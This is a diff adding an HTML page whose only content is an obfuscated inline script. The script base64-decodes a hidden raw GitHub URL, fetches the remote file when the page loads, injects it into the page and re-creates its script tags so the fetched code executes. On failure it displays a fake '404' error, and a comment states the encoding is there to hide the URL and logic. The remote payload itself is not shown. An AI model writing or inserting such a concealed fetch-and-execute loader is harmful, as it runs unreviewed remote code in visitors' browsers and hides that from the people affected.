@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"></head>
+<body>
+    <div id="content-area">Initialising...</div>
+    <script>
+        (function(_0x1){
+            // Encoded strings to hide the GitHub URL and logic
+            const _0x2 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hlbGxvZmx5Z2gvVGl0YW52My9tYWluL3N0YXJ0dXAuaHRtbA==';
+            const _0x3 = atob(_0x2); // Decodes the URL at runtime
+            const _0x4 = document.getElementById('content-area');
+
+            async function _0x5() {
+                try {
+                    const _0x6 = await fetch(_0x3);
+                    if (!_0x6.ok) return;
+                    const _0x7 = await _0x6.text();
+                    _0x4.innerHTML = _0x7;
+
+                    const _0x8 = _0x4.querySelectorAll("script");
+                    _0x8.forEach(_0x9 => {
+                        const _0x10 = document.createElement("script");
+                        Array.from(_0x9.attributes).forEach(_0x11 => {
+                            _0x10.setAttribute(_0x11.name, _0x11.value);
+                        });
+                        _0x10.appendChild(document.createTextNode(_0x9.innerHTML));
+                        _0x9.parentNode.replaceChild(_0x10, _0x9);
+                    });
+                } catch (e) {
+                    _0x4.innerHTML = "System Error: 404";
+                }
+            }
+            _0x5();
+        })();
+    </script>
+</body>
+</html>
